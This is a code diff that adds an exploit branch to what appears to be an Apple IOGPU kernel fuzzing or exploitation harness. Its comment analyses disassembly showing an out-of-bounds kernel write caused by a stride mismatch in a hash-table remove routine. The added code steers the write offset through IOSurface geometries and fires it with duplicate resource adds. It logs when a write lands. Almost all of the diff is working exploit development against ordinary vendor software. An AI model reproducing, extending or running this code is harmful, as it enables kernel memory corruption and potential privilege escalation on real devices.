@@ -518,6 +518,75 @@ void nk_iogpu_group_oob_run(int trigger)
         ol("[grp] index sweep done (no crash)");
     }
 
+
+    if (trigger == 6) {
+        /* CONTROLLED OOB WRITE via the duplicate insert.
+         *
+         * The hash table's remove (0x9f518ac) takes its element from the
+         * array at +0x10 with an 8-byte stride (ubfiz x9, x1, #3) while
+         * that array is allocated as kalloc(capacity*4) - four bytes per
+         * slot. The only guard is "index < capacity" (0x9f518b4). With
+         * capacity 64 the array is 256 bytes, so any index >= 32 writes
+         * eight bytes past the end:
+         *   0x9f518ec: ldr x8, [x10]
+         *   0x9f518f0: str xzr, [x10]
+         * The index is (bit + bucket) & (capacity-1) and the bucket comes
+         * from hash = [resource+0x70] * 0x9e3779b97f4a7c15, i.e. from a
+         * field of the IOSurface we added. Changing the surface properties
+         * changes the hash, so the index - and with it the write offset -
+         * is steerable.
+         *
+         * The duplicate insert is what triggers the remove: the insert
+         * finds the old entry and drops it. So: for many different surface
+         * geometries, add twice and watch. A kill is the OOB write landing
+         * on something that matters.
+         */
+        ol("[grp] === CONTROLLED OOB WRITE (dup-add + index steering) ===");
+        static uint8_t o6[0x200];
+        size_t on6 = 0;
+
+        struct { uint32_t w, h, bpe, fmt; } geos[] = {
+            { 16, 16, 4, 0 }, { 32, 32, 4, 0 }, { 64, 64, 4, 0 },
+            { 128, 128, 4, 0 }, { 256, 256, 4, 0 }, { 512, 512, 4, 0 },
+            { 1024, 1024, 4, 0 }, { 17, 13, 4, 0 }, { 33, 31, 4, 0 },
+            { 65, 63, 4, 0 }, { 129, 127, 4, 0 }, { 255, 255, 4, 0 },
+            { 1023, 1023, 4, 0 }, { 4095, 4095, 4, 0 }, { 7, 5, 4, 0 },
+            { 8, 8, 1, 0 }, { 8, 8, 2, 0 }, { 8, 8, 8, 0 },
+            { 12, 12, 16, 0 }, { 2048, 2048, 4, 0 }
+        };
+        uint32_t ngeo = sizeof(geos) / sizeof(geos[0]);
+
+        for (uint32_t gi = 0; gi < ngeo; gi++) {
+            const void *keys[] = { kIOSurfaceWidth, kIOSurfaceHeight,
+                                   kIOSurfaceBytesPerElement, kIOSurfacePixelFormat };
+            CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &geos[gi].w);
+            CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &geos[gi].h);
+            CFNumberRef nb = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &geos[gi].bpe);
+            CFNumberRef nf = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &geos[gi].fmt);
+            const void *vals[] = { nw, nh, nb, nf };
+            CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 4,
+                                                      &kCFTypeDictionaryKeyCallBacks,
+                                                      &kCFTypeDictionaryValueCallBacks);
+            IOSurfaceRef s = props ? IOSurfaceCreate(props) : NULL;
+            if (props) CFRelease(props);
+            CFRelease(nw); CFRelease(nh); CFRelease(nb); CFRelease(nf);
+            if (!s) { ol("[grp] geo[%u] %ux%u bpe=%u - surface failed", gi, geos[gi].w, geos[gi].h, geos[gi].bpe); continue; }
+            uint32_t (*getid)(IOSurfaceRef) = (uint32_t (*)(IOSurfaceRef))dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+            uint32_t id = getid ? getid(s) : 0;
+            ol("[grp] geo[%u] %ux%u bpe=%u -> global id=%u", gi, geos[gi].w, geos[gi].h, geos[gi].bpe, id);
+
+            int k6 = call_sel(conn, CMD_NEW_GROUP, 64, id, 0, 0, o6, &on6);
+            if (k6 != 0) { ol("[grp] geo[%u] group failed kr=0x%x", gi, k6); CFRelease(s); continue; }
+            int a1 = call_sel(conn, CMD_ADD_RES, id, 1, 0, 0, o6, &on6);
+            int a2 = call_sel(conn, CMD_ADD_RES, id, 1, 0, 0, o6, &on6);
+            ol("[grp] geo[%u] id=%u add1=0x%x add2=0x%x%s", gi, id, a1, a2,
+               (a2 == (int)0x10000003) ? "  *** CLIENT DIED - OOB WRITE LANDED ***" : "");
+            if (a2 == (int)0x10000003) { ol("[grp] dead at geo[%u]", gi); break; }
+            CFRelease(s);
+        }
+        ol("[grp] controlled OOB write sweep done");
+    }
+
     if (trigger == 0 || trigger == 4) {
         /* DUPLICATE ADD = THE REMOVE PATH.
          *
